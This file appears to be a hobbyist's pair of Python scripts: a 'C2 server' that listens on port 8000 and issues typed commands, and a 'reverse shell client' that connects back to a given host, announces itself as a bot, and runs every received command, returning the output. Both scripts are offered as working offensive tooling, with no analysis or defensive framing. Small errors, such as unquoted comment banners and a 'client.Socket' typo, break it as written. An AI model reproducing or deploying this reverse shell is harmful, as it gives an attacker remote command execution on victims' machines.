#!/usr/bin/env python3


************************
* Author: Brian Dorsey *
* Date: 1/16/2024      *
* C2 server            *
************************




from socket import * #Need to cleanup


serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)
print("Attacker Box listening and awaiting instructions")
connectionSocket, addr = serverSocket.accept()
print("Thanks for connecting to me " + str(addr)) #come back and use f'string
message = connectionSocket.recv(1024)
print(message)
command = ""
while command != "exit":
    command = input("Enter a command: ")
    connectionSocket.send(command.encode())
    message = connectionSocket.recv(1024).decode()
    print(message)


connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()


###########################################################################################################################3


#!/usr/bin/env python3


*************************************
* Author: Brian Dorsey              *
* Date: 1/16/2024                   *
* reverse shell client              *
*************************************



import sys
from subprocess import Popen, PIPE
from socket import *  #Need to come back and replace *


serverName = sys.argv[1]
serverPort = 8000
#Create socket
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
client.Socket.send('Bot reporting for duty'.encode())
command = clientSocket.recv(4064).decode()

while command != "exit":
    
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    clientSocket.send(result)
    command = (clientSocket.recv(4064)).decode()

clientSocket.close()



